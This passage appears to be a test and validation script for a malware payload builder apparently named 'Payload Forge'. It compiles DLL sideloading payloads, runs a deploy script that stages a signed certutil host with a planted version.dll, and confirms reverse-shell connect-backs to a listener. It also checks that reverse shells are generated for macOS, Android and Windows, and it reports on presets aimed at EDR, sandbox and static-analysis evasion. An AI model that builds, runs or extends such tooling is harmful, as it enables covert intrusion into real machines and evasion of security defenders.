  const dir = path.join(OUT, '_rtcheck');   // name deliberately avoids the '-dll' validator filter
  fs.rmSync(dir, { recursive: true, force: true });
  fs.mkdirSync(dir, { recursive: true });
  PF.S.plat = 'win'; PF.S.fmt = 'dll'; PF.S.wrapper = 'none';
  PF.S.sl.exec = 'self'; PF.S.sl.host = 'search'; PF.S.checks = {};
  PF.update();
  PF.setShell(''); PF.setLhost('127.0.0.1');
  // synchronous free-port probe (port 0 → OS-assigned → release → reuse)
  let port = 55777;
  try {
    const po = execFileSync('powershell', ['-NoProfile', '-Command',
      '$l=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Loopback,0); $l.Start(); Write-Output ([System.Net.IPEndPoint]$l.LocalEndpoint).Port; $l.Stop()'],
      { encoding: 'utf8', timeout: 20000 });
    port = parseInt(po.trim(), 10);
  } catch (e) {}
  {
    PF.setLport(port);
    PF.update();
    for (const f of splitSections(PF.getCur())) fs.writeFileSync(path.join(dir, f.name), f.content);
    const winDir = dir.replace(/\//g, '\\');
    const r = runCmd(`cd /d "${winDir}" && call "${VCVARS}" >nul 2>&1 && cl /nologo /LD /O2 /Fe:msscntrs.dll sideload.c sideload.def ws2_32.lib`);
    if (!r.ok || !fs.existsSync(path.join(dir, 'msscntrs.dll'))) { dllRuntimeErrors.push('DLL runtime: compile failed'); return; }
    const ps = `$ErrorActionPreference='Stop'
$dll = $args[0]
$port = [int]$args[1]
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class PFRT {
  [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
  public static extern IntPtr LoadLibrary(string p);
}
"@
$tcp = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Loopback, $port)
$tcp.Start()
$ar = $tcp.BeginAcceptTcpClient($null, $null)
$h = [PFRT]::LoadLibrary($dll)
if ($h -eq [IntPtr]::Zero) { Write-Output 'FAIL: LoadLibrary'; $tcp.Stop(); exit 1 }
$ok = $ar.AsyncWaitHandle.WaitOne(9000)
if ($ok) { Write-Output 'OK: connect-back' } else { Write-Output 'FAIL: no connect-back' }
$tcp.Stop()
`;
    fs.writeFileSync(path.join(dir, 'check.ps1'), ps);
    const rr = runCmd(`powershell -NoProfile -ExecutionPolicy Bypass -File "${winDir}\\check.ps1" "${winDir}\\msscntrs.dll" ${port}`);
    if (rr.ok && rr.out.includes('OK: connect-back'))
      console.log('DLL RUNTIME FIRING: PASS (LoadLibrary → DllMain → runner thread → connect-back)');
    else
      dllRuntimeErrors.push('DLL runtime: no connect-back — ' + rr.out.trim().split(/\r?\n/).join(' | '));
  }
})();

// --- DLL deploy live-fire (REAL deploy.ps1 + REAL signed host, loopback) --
// Runs the ACTUAL deploy.ps1 from a staging dir — it copies certutil.exe from
// System32, drops version.dll next to it, and launches the host. Asserts:
//  1. the pre-flight export probe passes ("export check OK (10/10)")
//  2. the runner thread completes a TCP connect-back to a waiting listener
//     while certutil is alive (~39 ms on this box — measured; the completed
//     handshake is the proof, TCP cannot complete connect() without accept).
// This is the only check that exercises probe → staging → host launch →
// DllMain → runner → socket together.
const dllDeployErrors = [];
(function () {
  if (!HAS_MSVC) return;
  const dir = path.join(OUT, '_deployfire');
  fs.rmSync(dir, { recursive: true, force: true });
  fs.mkdirSync(dir, { recursive: true });
  PF.S.plat = 'win'; PF.S.fmt = 'dll'; PF.S.wrapper = 'none';
  PF.S.sl.exec = 'self'; PF.S.sl.host = 'cert'; PF.S.checks = {};
  els['sel-slhost'] = els['sel-slhost'] || makeEl(); els['sel-slhost'].value = 'cert';
  els['sel-slexec'] = els['sel-slexec'] || makeEl(); els['sel-slexec'].value = 'self';
  PF.update();
  PF.setShell(''); PF.setLhost('127.0.0.1');
  let port = 55778;
  try {
    const po = execFileSync('powershell', ['-NoProfile', '-Command',
      '$l=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Loopback,0); $l.Start(); Write-Output ([System.Net.IPEndPoint]$l.LocalEndpoint).Port; $l.Stop()'],
      { encoding: 'utf8', timeout: 20000 });
    port = parseInt(po.trim(), 10);
  } catch (e) {}
  {
    PF.setLport(port);
    PF.update();
    for (const f of splitSections(PF.getCur())) fs.writeFileSync(path.join(dir, f.name), f.content);
    const winDir = dir.replace(/\//g, '\\');
    const r = runCmd(`cd /d "${winDir}" && call "${VCVARS}" >nul 2>&1 && cl /nologo /LD /O2 /Fe:version.dll sideload.c sideload.def ws2_32.lib`);
    if (!r.ok || !fs.existsSync(path.join(dir, 'version.dll'))) { dllDeployErrors.push('DLL deploy: compile failed'); return; }
    const ps = `$ErrorActionPreference='SilentlyContinue'
$port = [int]$args[0]
$dep = $args[1]
$tcp = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Loopback, $port)
$tcp.Start()
$ar = $tcp.BeginAcceptTcpClient($null, $null)
$depOut = & powershell -NoProfile -ExecutionPolicy Bypass -File $dep 2>&1 | Out-String
$okProbe = $depOut -match 'export check OK \\(10/10\\)'
$ok = $ar.AsyncWaitHandle.WaitOne(9000)
if ($okProbe -and $ok) { Write-Output 'OK: probe + connect-back under real deploy.ps1' }
else { Write-Output ('FAIL: probe=' + $okProbe + ' connect=' + $ok + ' | ' + ($depOut.Trim() -replace "\\s+",' ')) }
$tcp.Stop()
`;
    fs.writeFileSync(path.join(dir, 'check.ps1'), ps);
    const rr = runCmd(`powershell -NoProfile -ExecutionPolicy Bypass -File "${winDir}\\check.ps1" ${port} "${winDir}\\deploy.ps1"`);
    if (rr.ok && rr.out.includes('OK: probe + connect-back'))
      console.log('DLL DEPLOY LIVE-FIRE: PASS (real deploy.ps1: export probe → System32 certutil → connect-back)');
    else
      dllDeployErrors.push('DLL deploy: ' + rr.out.trim().split(/\r?\n/).join(' | '));
  }
})();

// --- empty-shell fallbacks (no imported shellcode → plain reverse shell) ---
(function () {
  PF.S.plat = 'mac'; PF.S.fmt = 'c'; PF.S.wrapper = 'none';
  PF.setShell(''); PF.S.checks = {};
  PF.update();
  const mc = PF.getCur();
  if (!mc.includes('socket(AF_INET, SOCK_STREAM, 0)') || !mc.includes('dup2(') || !mc.includes('execl('))
    genErrors.push('mac empty-shell fallback: plain C reverse shell structure missing');
  PF.S.plat = 'android'; PF.S.fmt = 'java'; PF.S.wrapper = 'none';
  PF.update();
  const aj = PF.getCur();
  if (!aj.includes('new java.net.Socket(h, p)') || !aj.includes('/system/bin/sh'))
    genErrors.push('android empty-shell fallback: Java reverse shell structure missing');
  PF.S.plat = 'win'; PF.S.fmt = 'dll'; PF.S.wrapper = 'none'; PF.S.sl.exec = 'self';
  PF.update();
  const dl = PF.getCur();
  if (!dl.includes('WSAStartup') || !dl.includes('STARTF_USESTDHANDLES') || !dl.includes('cmd'))
    genErrors.push('dll empty-shell fallback: winsock reverse shell structure missing');
})();

// --- native launcher chains: bash syntax + artifact reference -------
const launchResults = [];
const launchNegErrors = [];
for (const [fmt, w, ref] of [['mac', 'sh', './payload'], ['mac', 'app', 'payload.app'], ['and', 'build', 'libloader.so']]) {
  for (const p of PF.PRESETS) {
    const dir = path.join(OUT, `${p.id}-${fmt}-${w}`);
    const lp = path.join(dir, 'launcher.txt');
    if (!fs.existsSync(lp)) { launchResults.push({ key: `${p.id}|${fmt}-${w}`, pass: false, detail: 'missing launcher.txt' }); continue; }
    const launcher = fs.readFileSync(lp, 'utf8');
    let pass = launcher.trim().startsWith('#!/bin/bash');
    let detail = pass ? '' : 'not a bash script';
    if (pass && HAS_BASH) {
      const r = run('bash', ['-n', lp]);
      if (!r.ok) { pass = false; detail = 'bash -n: ' + r.out.trim().split(/\r?\n/).slice(0, 2).join(' | '); }
    }
    if (pass && !launcher.includes(ref)) { pass = false; detail = `missing artifact ref '${ref}'`; }
    launchResults.push({ key: `${p.id}|${fmt}-${w}`, pass, detail: pass ? (HAS_BASH ? 'bash -n OK + artifact ref' : 'artifact ref (bash n/a)') : detail });
  }
  if (HAS_BASH) {
    // negative control: broken bash must be caught by bash -n
    const negSh = path.join(OUT, '_neg', 'broken.sh');
    fs.mkdirSync(path.dirname(negSh), { recursive: true });
    fs.writeFileSync(negSh, '#!/bin/bash\nif then\nfi\n');
    const rb = run('bash', ['-n', negSh]);
    if (rb.ok) launchNegErrors.push('broken bash was NOT detected by bash -n');
  }
}
fs.rmSync(path.join(OUT, '_neg'), { recursive: true, force: true });

/* ---------------------------------------------------------------------
 * Report
 * --------------------------------------------------------------------- */
const order = ['cs', 'ps1', 'enc', 'vbs', 'hta', 'dll', 'dllh', 'mac', 'and'];
const labels = { cs: 'C#', ps1: 'PS1', enc: '-ENC', vbs: 'VBS', hta: 'HTA', dll: 'DLL', dllh: 'DLL+H', mac: 'C-MAC', and: 'JAVA' };
console.log('\n=== PAYLOAD FORGE — BUILD VALIDATION MATRIX ===');
console.log('toolchain: csc.exe 4.8 (.NET Framework) · PowerShell ' + (() => {
  try { return execFileSync(PWSH, ['-NoProfile','-Command','$PSVersionTable.PSVersion.ToString()'], {encoding:'utf8'}).trim(); }
  catch { return '?'; }
})() + '\n');
const presetNames = { vanilla:'VANILLA', 'static-resist':'STATIC', sandbox:'SANDBOX', edr:'EDR', opsec:'OPSEC' };

let total = 0, passed = 0;
const grid = {};
for (const r of results) {
  total++; if (r.pass) passed++;
  grid[r.preset] = grid[r.preset] || {};
  const prev = grid[r.preset][r.fmt];
  if (!prev || !prev.pass) grid[r.preset][r.fmt] = r;  // a failing variant must surface
}
const header = 'preset      ' + order.map(f => labels[f].padStart(7)).join('') + '   TECH';
console.log(header);
for (const p of Object.keys(grid)) {
  const cells = order.map(f => {
    const r = grid[p][f];
    return (r ? (r.pass ? '  PASS ' : '  FAIL ') : '   —   ').slice(0, 7);
  }).join('');
  console.log((presetNames[p] || p).padEnd(12) + cells + '   ' + meta[`${p}|cs`].techCount);
}
console.log('\n' + '='.repeat(header.length));
console.log(`RESULT: ${passed}/${total} builds valid`);
console.log(`PERSISTENCE ROUND-TRIP: ${restoreErrors.length ? 'FAIL' : 'PASS'}` +
  (restoreErrors.length ? '\n  ' + restoreErrors.join('\n  ') : ' (state save → fresh-context restore → corrupt-blob fallback)'));
console.log(`VBSCRIPT WRAPPER CHECK: ${wrapperNegErrors.length ? 'FAIL' : 'PASS'}` +
  (wrapperNegErrors.length ? '\n  ' + wrapperNegErrors.join('\n  ') : ' (real engine parse of VBS + HTA wrapper layers, negative control OK)'));
const launchPass = launchResults.filter(r => r.pass).length;
console.log(`NATIVE LAUNCHERS: ${launchPass}/${launchResults.length} (mac .sh/.app + android build.sh)` +
  (launchPass === launchResults.length ? ' — bash -n OK + artifact refs' : ' — FAILURES:'));
console.log(`DLL RUNTIME FIRING: ${dllRuntimeErrors.length ? 'FAIL' : 'PASS'} (LoadLibrary → DllMain → runner thread → TCP connect-back, loopback)` +
  (dllRuntimeErrors.length ? '\n  ' + dllRuntimeErrors.join('\n  ') : ''));
console.log(`DLL DEPLOY LIVE-FIRE: ${dllDeployErrors.length ? 'FAIL' : 'PASS'} (real deploy.ps1: export probe → System32 certutil → connect-back)` +
  (dllDeployErrors.length ? '\n  ' + dllDeployErrors.join('\n  ') : ''));
const hostPass = hostSweepResults.filter(r => r.pass).length;
console.log(`DLL HOST SWEEP: ${hostPass}/${hostSweepResults.length} verified hosts (real cl.exe compile + dumpbin exports + deploy.ps1 parse)` +
  (hostPass === hostSweepResults.length ? '' : ' — FAILURES:'));
for (const h of hostSweepResults.filter(r => !r.pass)) console.log('  ' + h.hid + ': ' + h.detail);
for (const l of launchResults.filter(r => !r.pass)) console.log('  ' + l.key + ': ' + l.detail);
if (launchNegErrors.length) console.log('LAUNCHER NEGATIVE CONTROL: FAIL\n  ' + launchNegErrors.join('\n  '));

const fails = results.filter(r => !r.pass);
if (fails.length || launchResults.some(r => !r.pass) || hostSweepResults.some(r => !r.pass)) {
  console.log('\n--- FAILURES ---');
  for (const f of fails) console.log(`[${presetNames[f.preset]||f.preset} ${labels[f.fmt]}] ${f.detail}`);
  for (const l of launchResults.filter(r => !r.pass)) console.log(`[LAUNCHER ${l.key}] ${l.detail}`);
  for (const h of hostSweepResults.filter(r => !r.pass)) console.log(`[HOST-SWEEP ${h.hid}] ${h.detail}`);
  process.exitCode = 1;
} else {
  console.log('All outputs compile / parse clean with the real toolchain.');
}
if (genErrors.length || restoreErrors.length || wrapperNegErrors.length || launchNegErrors.length || dllRuntimeErrors.length || dllDeployErrors.length) {
  console.log('\n--- GENERATOR / PERSISTENCE / WRAPPER / DLL-RUNTIME / DEPLOY ERRORS ---');
  for (const g of genErrors) console.log(g);
  for (const r of restoreErrors) console.log(r);
  for (const w of wrapperNegErrors) console.log(w);
  for (const d of dllRuntimeErrors) console.log(d);
  for (const d of dllDeployErrors) console.log(d);
  process.exitCode = 1;
}
